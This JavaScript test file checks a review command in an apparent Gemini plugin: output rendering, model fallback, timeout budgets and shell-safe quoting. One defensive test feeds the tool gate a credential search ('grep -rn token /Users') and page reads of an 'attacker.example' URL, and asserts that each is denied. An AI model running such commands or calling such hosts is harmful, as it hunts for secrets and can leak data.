import { test, beforeEach, afterEach } from "node:test";
import { execFileSync } from "node:child_process";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import {
  handleReview,
  setRunReviewForTest,
  PRIMARY_REVIEW_MODEL,
  FALLBACK_REVIEW_MODEL,
  GATED_TOOLS,
  REVIEW_GATED_TOOLS
} from "../scripts/gemini-companion.mjs";
import {
  ConfigError,
  AgyAuthError,
  AgyConnectionError,
  AgyModelError,
  AgyQuotaError,
  AgyTimeoutError
} from "../scripts/lib/errors.mjs";

function captureStdout(fn) {
  const chunks = [];
  const orig = process.stdout.write.bind(process.stdout);
  process.stdout.write = (chunk) => {
    chunks.push(typeof chunk === "string" ? chunk : chunk.toString("utf8"));
    return true;
  };
  return fn().finally(() => {
    process.stdout.write = orig;
  }).then(() => chunks.join(""));
}

const okPayload = {
  stopReason: "end_turn",
  text: JSON.stringify({
    overall: "mixed",
    summary: "Mixed bag.",
    claims: [
      {
        claim: "Redis is AP per CAP theorem.",
        verdict: "contradicted",
        reasoning: "Redis is CP in common configs.",
        correction: "Redis defaults to CP with consistent replication.",
        sources: ["https://redis.io/docs/latest/operate/oss_and_stack/management/replication/"]
      },
      {
        claim: "JSON.parse throws SyntaxError.",
        verdict: "supported",
        reasoning: "Matches the language spec.",
        sources: ["https://tc39.es/ecma262/#sec-json.parse"]
      },
      {
        claim: "Node 25 ships a native HTTP/3 client.",
        verdict: "uncertain",
        reasoning: "Search returned nothing definitive."
      }
    ],
    reasoning_issues: []
  }),
  response: "",
  model: null,
  tokens: { input_tokens: 34702, output_tokens: 407, total_tokens: 35109 },
  deniedActions: [],
  timedOut: false,
  agentVersion: "1.0.0"
};

beforeEach(() => {
  setRunReviewForTest(null);
});
afterEach(() => {
  setRunReviewForTest(null);
});

test("rejects empty stdin with a clear ConfigError", async () => {
  setRunReviewForTest(async () => {
    throw new Error("should not be called");
  });
  await assert.rejects(
    () => handleReview([], { stdin: "" }),
    (err) => err instanceof ConfigError && /no content received/i.test(err.message)
  );
});

test("rejects whitespace-only stdin", async () => {
  setRunReviewForTest(async () => {
    throw new Error("should not be called");
  });
  await assert.rejects(
    () => handleReview([], { stdin: "   \n\t  " }),
    ConfigError
  );
});

test("happy path: renders structured output with claims and sources, passes the schema file to the runner", async () => {
  setRunReviewForTest(async (args) => {
    assert.match(args.prompt, /content_to_review/);
    assert.match(args.prompt, /Redis is AP/);
    assert.match(args.prompt, /search_web/);
    assert.match(args.jsonSchema, /schemas[\/\\]review-output\.schema\.json$/);
    // The runner must not receive any modelId, as agy 1.0.0 ignores model selection.
    assert.equal("modelId" in args, false);
    return okPayload;
  });
  const out = await captureStdout(() =>
    handleReview([], { stdin: "I believe Redis is AP per CAP theorem. Also JSON.parse throws SyntaxError." })
  );
  assert.match(out, /Gemini Review/);
  assert.match(out, /Overall: mixed/);
  assert.match(out, /\[contradicted\]/);
  assert.match(out, /\[supported\]/);
  assert.match(out, /\[uncertain\]/);
  assert.match(out, /sources:/);
  assert.match(out, /https:\/\/redis\.io/);
  assert.match(out, /\[grounding\] 2 source URLs cited/);
  assert.match(out, /tokens: 34702 in \/ 407 out/);
  assert.doesNotMatch(out, /refused/);
  // The hardcoded primary model is surfaced in the header.
  assert.match(out, /model: gemini-4-argon-high/);
  assert.doesNotMatch(out, /fell back/);
});

test("grounding footer warns when no tool calls AND no claim sources", async () => {
  setRunReviewForTest(async () => ({
    ...okPayload,
    text: JSON.stringify({
      overall: "mixed",
      summary: "No sources.",
      claims: [
        { claim: "x", verdict: "uncertain", reasoning: "y" }
      ],
      reasoning_issues: []
    })
  }));
  const out = await captureStdout(() => handleReview([], { stdin: "claim body" }));
  assert.match(out, /No claim sources cited/);
  assert.match(out, /Treat results as ungrounded/);
});

test("--json mode emits stable payload with model selection fields", async () => {
  setRunReviewForTest(async (args) => ({ ...okPayload, model: args.model }));
  const out = await captureStdout(() =>
    handleReview(["--json"], { stdin: "some text with a claim" })
  );
  const payload = JSON.parse(out);
  assert.equal(payload.target.mode, "review");
  assert.equal(payload.target.truncated, false);
  assert.ok(typeof payload.target.inputBytes === "number");
  assert.equal(payload.stopReason, "end_turn");
  assert.equal(payload.parsed.overall, "mixed");
  assert.equal(payload.parseError, null);
  assert.deepEqual(payload.deniedActions, []);
  assert.equal(payload.timedOut, false);
  assert.equal(payload.tokens.output_tokens, 407);
  assert.equal(Object.prototype.hasOwnProperty.call(payload, "toolCalls"), false);
  assert.equal(payload.model, "gemini-4-argon-high");
  assert.equal(payload.requestedModel, "gemini-4-argon-high");
  assert.equal(payload.fellBack, false);
  assert.equal(payload.fallbackReason, null);
  assert.equal(Object.prototype.hasOwnProperty.call(payload, "downgraded"), false);
});

test("parse failure (degraded, text mode): label tagged degraded, raw reasoning preserved, no error lede", async () => {
  setRunReviewForTest(async () => ({
    ...okPayload,
    text: "I will now emit the JSON, but I never did. The claim is contradicted by the 2023 paper."
  }));
  const out = await captureStdout(() => handleReview([], { stdin: "x" }));
  assert.match(out, /review \([^)]*degraded[^)]*\)/);
  assert.match(out, /Raw output:/);
  assert.match(out, /The claim is contradicted by the 2023 paper/);
  assert.doesNotMatch(out.split("\n").slice(0, 4).join("\n"), /Could not parse structured output/);
});

test("parse failure (degraded, --json): parsed null, parseError set, rawOutput preserved", async () => {
  const reasoning = "I will now emit the JSON, but I never did. Contradicted by the 2023 paper.";
  setRunReviewForTest(async () => ({
    ...okPayload,
    text: reasoning
  }));
  const out = await captureStdout(() =>
    handleReview(["--json"], { stdin: "claim body" })
  );
  const payload = JSON.parse(out);
  assert.equal(payload.parsed, null);
  assert.ok(typeof payload.parseError === "string" && payload.parseError.length > 0);
  assert.equal(payload.rawOutput, reasoning);
});

test("parse failure (empty output): rendered message calls out the empty case without Raw output heading", async () => {
  setRunReviewForTest(async () => ({
    ...okPayload,
    text: ""
  }));
  const out = await captureStdout(() => handleReview([], { stdin: "x" }));
  assert.match(out, /review \([^)]*degraded[^)]*\)/);
  assert.match(out, /no usable output/i);
  assert.doesNotMatch(out, /Raw output:/);
});

test("positional arguments become focus text", async () => {
  setRunReviewForTest(async ({ prompt }) => {
    assert.match(prompt, /focus on security claims/);
    return okPayload;
  });
  await captureStdout(() =>
    handleReview(["focus", "on", "security", "claims"], { stdin: "claim body" })
  );
});

test("truncation is surfaced in both json target and rendered footer", async () => {
  setRunReviewForTest(async () => okPayload);
  const big = Array(5000).fill("this is a line of content about AI and facts.").join("\n");
  const out = await captureStdout(() =>
    handleReview(["--json"], { stdin: big })
  );
  const payload = JSON.parse(out);
  assert.equal(payload.target.truncated, true);
  assert.ok(payload.target.omittedBytes > 0);
});

test("truncation footer shown in rendered mode", async () => {
  setRunReviewForTest(async () => okPayload);
  const big = Array(5000).fill("another content line for truncation test.").join("\n");
  const out = await captureStdout(() => handleReview([], { stdin: big }));
  assert.match(out, /Input was truncated by/);
});

test("header shows the agy version and the model", async () => {
  setRunReviewForTest(async () => okPayload);
  const out = await captureStdout(() => handleReview([], { stdin: "claim body" }));
  assert.match(out, /agy 1\.0\.0/);
  // The plugin now selects the model, so the header names it.
  assert.match(out, /model: gemini-4-argon-high/);
  assert.doesNotMatch(out, /downgraded from/i);
});

test("--model picks the review model, and it is reported as requestedModel", async () => {
  const calls = [];
  setRunReviewForTest(async (args) => {
    calls.push(args.model);
    return { ...okPayload, model: args.model };
  });
  const json = JSON.parse(
    await captureStdout(() => handleReview(["--model", "gemini-4-argon-medium", "--json"], { stdin: "claim body" }))
  );
  assert.deepEqual(calls, ["gemini-4-argon-medium"]);
  assert.equal(json.model, "gemini-4-argon-medium");
  assert.equal(json.requestedModel, "gemini-4-argon-medium");
  assert.equal(json.fellBack, false);
});

test("a chosen non-Flash model that fails falls back to Flash", async () => {
  const calls = [];
  setRunReviewForTest(async (args) => {
    calls.push(args.model);
    if (args.model === "gemini-4-argon-low") throw new AgyQuotaError("argon quota used up");
    return { ...okPayload, model: args.model };
  });
  const json = JSON.parse(
    await captureStdout(() => handleReview(["--model", "gemini-4-argon-low", "--json"], { stdin: "x" }))
  );
  assert.deepEqual(calls, ["gemini-4-argon-low", FALLBACK_REVIEW_MODEL]);
  assert.equal(json.requestedModel, "gemini-4-argon-low");
  assert.equal(json.fellBack, true);
});

for (const flash of ["gemini-3.8-flash-high", "gemini-3.8-flash-medium", "gemini-3.8-flash-low", "gemini-3.8-flash"]) {
  test(`when the chosen model is Flash (${flash}), a failure is not retried: Flash shares one quota`, async () => {
    const calls = [];
    setRunReviewForTest(async (args) => {
      calls.push(args.model);
      throw new AgyQuotaError("flash quota used up");
    });
    await assert.rejects(
      () => handleReview(["--model", flash], { stdin: "x" }),
      (err) => err instanceof AgyQuotaError && err.message === "flash quota used up"
    );
    assert.deepEqual(calls, [flash]);
  });
}

test("--model needs a value", async () => {
  setRunReviewForTest(async () => okPayload);
  await assert.rejects(() => handleReview(["--model"], { stdin: "x" }), ConfigError);
});

test("the review models are Gemini 4 Argon, then Gemini 3.8 Flash", () => {
  assert.equal(PRIMARY_REVIEW_MODEL, "gemini-4-argon-high");
  assert.equal(FALLBACK_REVIEW_MODEL, "gemini-3.8-flash-high");
});

test("uses the primary model only when it succeeds", async () => {
  const calls = [];
  setRunReviewForTest(async (args) => {
    calls.push(args.model);
    return { ...okPayload, model: args.model };
  });
  const out = await captureStdout(() => handleReview([], { stdin: "a claim to check" }));
  assert.deepEqual(calls, ["gemini-4-argon-high"]);
  assert.match(out, /model: gemini-4-argon-high/);
});

for (const [name, makeErr] of [
  ["used-up quota", () => new AgyQuotaError('agy has no quota left for "gemini-4-argon-high": RESOURCE_EXHAUSTED')],
  ["unlisted model", () => new AgyModelError('agy does not know the model "gemini-4-argon-high".')],
  ["other agy error", () => new AgyConnectionError("agy --print failed (1): service unavailable")]
]) {
  test(`${name} on the primary falls back once to Flash and shows why`, async () => {
    const calls = [];
    setRunReviewForTest(async (args) => {
      calls.push(args.model);
      if (args.model === PRIMARY_REVIEW_MODEL) throw makeErr();
      return { ...okPayload, model: args.model };
    });
    const text = await captureStdout(() => handleReview([], { stdin: "a claim to check" }));
    assert.deepEqual(calls, [PRIMARY_REVIEW_MODEL, FALLBACK_REVIEW_MODEL]);
    assert.match(text, /model: gemini-3\.8-flash-high \(fell back from gemini-4-argon-high\)/);
    assert.match(text, /gemini-4-argon-high failed, so gemini-3\.8-flash-high ran the review instead\. Reason: /);
    assert.match(text, new RegExp(makeErr().message.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
    assert.match(text, /Overall: mixed/);

    calls.length = 0;
    const json = JSON.parse(await captureStdout(() => handleReview(["--json"], { stdin: "a claim to check" })));
    assert.equal(json.model, FALLBACK_REVIEW_MODEL);
    assert.equal(json.requestedModel, PRIMARY_REVIEW_MODEL);
    assert.equal(json.fellBack, true);
    assert.equal(json.fallbackReason, makeErr().message);
    assert.equal(json.parsed.overall, "mixed");
  });
}

test("a sign-in error is not retried on Flash", async () => {
  const calls = [];
  setRunReviewForTest(async (args) => {
    calls.push(args.model);
    throw new AgyAuthError("agy is not signed in");
  });
  await assert.rejects(() => handleReview([], { stdin: "a claim to check" }), AgyAuthError);
  assert.deepEqual(calls, [PRIMARY_REVIEW_MODEL]);
});

test("a hard timeout is not retried on Flash: the budget is gone", async () => {
  const calls = [];
  setRunReviewForTest(async (args) => {
    calls.push(args.model);
    throw new AgyTimeoutError("agy --print did not finish within 1230000ms.");
  });
  await assert.rejects(() => handleReview([], { stdin: "a claim to check" }), AgyTimeoutError);
  assert.deepEqual(calls, [PRIMARY_REVIEW_MODEL]);
});

test("a primary run that agy cut off (exit 0, timedOut) is returned, not retried", async () => {
  const calls = [];
  setRunReviewForTest(async (args) => {
    calls.push(args.model);
    return { ...okPayload, model: args.model, timedOut: true, stopReason: "timeout" };
  });
  const json = JSON.parse(await captureStdout(() => handleReview(["--json"], { stdin: "x" })));
  assert.deepEqual(calls, [PRIMARY_REVIEW_MODEL]);
  assert.equal(json.timedOut, true);
  assert.equal(json.fellBack, false);
});

test("the fallback gets only the time left in the budget", async () => {
  // Move the clock instead of waiting: a real wait lets the test reporter write
  // while stdout is captured, and its output is lost.
  const realNow = Date.now;
  let offsetMs = 0;
  Date.now = () => realNow() + offsetMs;
  const seen = [];
  setRunReviewForTest(async (args) => {
    seen.push(args.promptTimeoutMs);
    if (args.model === PRIMARY_REVIEW_MODEL) {
      offsetMs = 50_000;
      throw new AgyQuotaError("quota");
    }
    return okPayload;
  });
  try {
    await captureStdout(() => handleReview(["--timeout-ms", "200000"], { stdin: "x" }));
  } finally {
    Date.now = realNow;
  }
  assert.equal(seen[0], 200000);
  assert.ok(seen[1] <= 150000 && seen[1] > 149000, `fallback got ${seen[1]}`);
});

test("the fallback is skipped when less than 60 seconds of the budget are left", async () => {
  const calls = [];
  setRunReviewForTest(async (args) => {
    calls.push(args.model);
    throw new AgyQuotaError("agy has no quota left");
  });
  await assert.rejects(
    () => handleReview(["--timeout-ms", "30000"], { stdin: "x" }),
    (err) => err instanceof AgyQuotaError && /Skipped the fallback model 'gemini-3\.8-flash-high'/.test(err.message)
  );
  assert.deepEqual(calls, [PRIMARY_REVIEW_MODEL]);
});

test("when both models fail, the error names both causes", async () => {
  setRunReviewForTest(async (args) => {
    if (args.model === PRIMARY_REVIEW_MODEL) throw new AgyQuotaError("argon quota used up");
    throw new AgyConnectionError("flash service unavailable");
  });
  await assert.rejects(
    () => handleReview([], { stdin: "x" }),
    (err) =>
      err instanceof AgyConnectionError &&
      /requested model 'gemini-4-argon-high' failed: argon quota used up/.test(err.message) &&
      /fallback model 'gemini-3\.8-flash-high' also failed: flash service unavailable/.test(err.message)
  );
});

test("empty output with refused tools names the tools instead of a bare empty-output message", async () => {
  const deniedActions = [{ action: "read_url", display_name: "ReadUrlContent" }];
  setRunReviewForTest(async () => ({ ...okPayload, text: "", response: "", deniedActions }));
  const out = await captureStdout(() => handleReview([], { stdin: "x" }));
  assert.match(out, /review \([^)]*degraded[^)]*\)/);
  assert.match(out, /agy refused these tools: ReadUrlContent \(read_url\)/);

  const json = JSON.parse(await captureStdout(() => handleReview(["--json"], { stdin: "x" })));
  assert.equal(json.parsed, null);
  assert.match(json.parseError, /ReadUrlContent \(read_url\)/);
  assert.deepEqual(json.deniedActions, deniedActions);
});

test("refused tools appear in the grounding footer of a successful review", async () => {
  const deniedActions = [{ action: "command", display_name: "RunCommand" }];
  setRunReviewForTest(async () => ({ ...okPayload, deniedActions }));
  const out = await captureStdout(() => handleReview([], { stdin: "x" }));
  assert.match(out, /Overall: mixed/);
  assert.match(out, /\[grounding\] agy refused these tools: RunCommand \(command\)\./);
});

test("a schema run without structured output keeps agy's raw response as rawOutput", async () => {
  setRunReviewForTest(async () => ({ ...okPayload, text: "", response: "I searched but ran out of time." }));
  const json = JSON.parse(await captureStdout(() => handleReview(["--json"], { stdin: "x" })));
  assert.equal(json.parsed, null);
  assert.equal(json.parseError, "Model did not return structured output.");
  assert.equal(json.rawOutput, "I searched but ran out of time.");
});

test("a timed-out review is degraded and says it was cut off", async () => {
  setRunReviewForTest(async () => ({
    ...okPayload,
    text: "",
    response: "partial",
    timedOut: true,
    stopReason: "timeout",
    tokens: null
  }));
  const out = await captureStdout(() => handleReview([], { stdin: "x" }));
  assert.match(out, /review \([^)]*degraded[^)]*\)/);
  assert.match(out, /cut the review off/);

  const json = JSON.parse(await captureStdout(() => handleReview(["--json"], { stdin: "x" })));
  assert.equal(json.timedOut, true);
  assert.equal(json.stopReason, "timeout");
});

test("grounding redirect sources are resolved to the publisher URL", async () => {
  const redirect = "https://vertexaisearch.cloud.google.com/grounding-api-redirect/AAA";
  setRunReviewForTest(async () => ({
    ...okPayload,
    text: JSON.stringify({
      overall: "trustworthy",
      summary: "s",
      claims: [{ claim: "c", verdict: "supported", reasoning: "r", sources: [redirect] }],
      reasoning_issues: []
    })
  }));
  const origFetch = globalThis.fetch;
  globalThis.fetch = async (url, init) => {
    assert.equal(url, redirect);
    assert.equal(init.redirect, "manual");
    return { status: 302, headers: new Headers({ location: "https://nodejs.org/en/about/previous-releases" }) };
  };
  try {
    const out = await captureStdout(() => handleReview([], { stdin: "x" }));
    assert.match(out, /https:\/\/nodejs\.org\/en\/about\/previous-releases/);
    assert.doesNotMatch(out, /vertexaisearch/);
  } finally {
    globalThis.fetch = origFetch;
  }
});

test("--timeout-ms beats the env var, and a bad value is rejected", async () => {
  let seen;
  setRunReviewForTest(async (args) => {
    seen = args;
    return okPayload;
  });
  const prev = process.env.GEMINI_PLUGIN_CC_PROMPT_TIMEOUT_MS;
  process.env.GEMINI_PLUGIN_CC_PROMPT_TIMEOUT_MS = "90000";
  try {
    await captureStdout(() => handleReview(["--timeout-ms", "540000", "--wait"], { stdin: "x" }));
    assert.equal(seen.promptTimeoutMs, 540000);
    await captureStdout(() => handleReview([], { stdin: "x" }));
    assert.equal(seen.promptTimeoutMs, 90000);
  } finally {
    if (prev == null) delete process.env.GEMINI_PLUGIN_CC_PROMPT_TIMEOUT_MS;
    else process.env.GEMINI_PLUGIN_CC_PROMPT_TIMEOUT_MS = prev;
  }
  await assert.rejects(() => handleReview(["--timeout-ms", "soon"], { stdin: "x" }), ConfigError);
});

// Focus text with every shell-special character review.md must survive.
const TRICKY_FOCUS = `check Node's "LTS" date, $HOME and \`uname\` stay literal`;

test("focus text arrives as one plain argument and is never re-split", async () => {
  let prompt;
  setRunReviewForTest(async (args) => {
    prompt = args.prompt;
    return okPayload;
  });
  // Alone (the case the old re-splitting mangled) and after flags.
  await captureStdout(() => handleReview([TRICKY_FOCUS], { stdin: "x" }));
  assert.ok(prompt.includes(TRICKY_FOCUS));
  await captureStdout(() => handleReview(["--timeout-ms", "540000", "--wait", TRICKY_FOCUS], { stdin: "x" }));
  assert.ok(prompt.includes(TRICKY_FOCUS));
});

test("review.md's single-quote rule hands the shell's argv over unchanged", () => {
  // Quote the way review.md tells Claude to: wrap in '...' and write ' as '\''.
  const quoted = `'${TRICKY_FOCUS.replace(/'/g, "'\\''")}'`;
  const out = execFileSync("/bin/sh", [
    "-c",
    `node -e 'console.log(JSON.stringify(process.argv.slice(1)))' -- --wait ${quoted}`
  ], { encoding: "utf8" });
  assert.deepEqual(JSON.parse(out), ["--wait", TRICKY_FOCUS]);
});

test("the run gets the whole --timeout-ms budget", async () => {
  const timeouts = [];
  setRunReviewForTest(async (args) => {
    timeouts.push(args.promptTimeoutMs);
    return { ...okPayload, model: args.model };
  });
  await captureStdout(() => handleReview(["--timeout-ms", "600000"], { stdin: "x" }));
  assert.deepEqual(timeouts, [600000]);
});

test("review runs agy with a hook that denies every command, subagent and page read", async () => {
  let cwd;
  setRunReviewForTest(async (args) => {
    cwd = args.cwd;
    // Run the hook the way agy does, from the hooks.json in the temp folder.
    const hooks = JSON.parse(fs.readFileSync(path.join(cwd, ".agents", "hooks.json"), "utf8"));
    const [group] = hooks["gemini-plugin-command-gate"].PreToolUse;
    assert.equal(group.matcher, REVIEW_GATED_TOOLS);
    // A review needs only web search: page reads leave with the rest.
    for (const tool of ["run_command", "invoke_subagent", "schedule", "read_url_content", "open_browser_url"]) {
      assert.match(tool, new RegExp(group.matcher), tool);
    }
    for (const tool of ["search_web", "finish"]) {
      assert.doesNotMatch(tool, new RegExp(group.matcher), tool);
    }
    const calls = [
      { name: "run_command", args: { CommandLine: "ls /tmp" } },
      { name: "run_command", args: { CommandLine: "grep -rn token /Users" } },
      { name: "invoke_subagent", args: { Prompt: "x" } },
      { name: "read_url_content", args: { Url: "https://attacker.example/?q=claim" } },
      { name: "open_browser_url", args: { Url: "https://attacker.example/" } }
    ];
    for (const toolCall of calls) {
      const out = execFileSync("sh", ["-c", group.hooks[0].command], { input: JSON.stringify({ toolCall }), encoding: "utf8" });
      assert.equal(JSON.parse(out).decision, "deny", toolCall.name);
    }
    return okPayload;
  });
  const out = await captureStdout(() => handleReview(["--json"], { stdin: "claim body" }));
  assert.deepEqual(JSON.parse(out).deniedActions, [
    { action: "command", display_name: "ls /tmp" },
    { action: "command", display_name: "grep -rn token /Users" },
    { action: "invoke_subagent" },
    { action: "read_url_content" },
    { action: "open_browser_url" }
  ]);
  assert.equal(fs.existsSync(cwd), false, "the temp folder is removed");
  // Ask keeps its page reads.
  assert.doesNotMatch("read_url_content", new RegExp(GATED_TOOLS));
  assert.doesNotMatch("open_browser_url", new RegExp(GATED_TOOLS));
});

test("review refuses --cwd, which would skip the gated temp folder, without calling agy", async () => {
  setRunReviewForTest(async () => {
    throw new Error("should not be called");
  });
  for (const argv of [["--cwd", "/tmp"], ["--cwd=/tmp"], ["--cwd=/tmp", "check dates"]]) {
    await assert.rejects(
      () => handleReview(argv, { stdin: "claim body" }),
      (err) => err instanceof ConfigError && /--cwd/.test(err.message),
      JSON.stringify(argv)
    );
  }
});

test("focus text after -- is focus text, also when it starts with --cwd=, and the run stays gated", async () => {
  let seen;
  setRunReviewForTest(async (args) => {
    seen = args;
    const hooks = JSON.parse(fs.readFileSync(path.join(args.cwd, ".agents", "hooks.json"), "utf8"));
    assert.equal(hooks["gemini-plugin-command-gate"].PreToolUse[0].matcher, REVIEW_GATED_TOOLS);
    return okPayload;
  });
  await captureStdout(() => handleReview(["--json", "--", "--cwd=/tmp check dates"], { stdin: "claim body" }));
  assert.match(seen.prompt, /<user_focus>\n--cwd=\/tmp check dates\n<\/user_focus>/);
  assert.match(path.basename(seen.cwd), /^gemini-review-cwd-/);
});
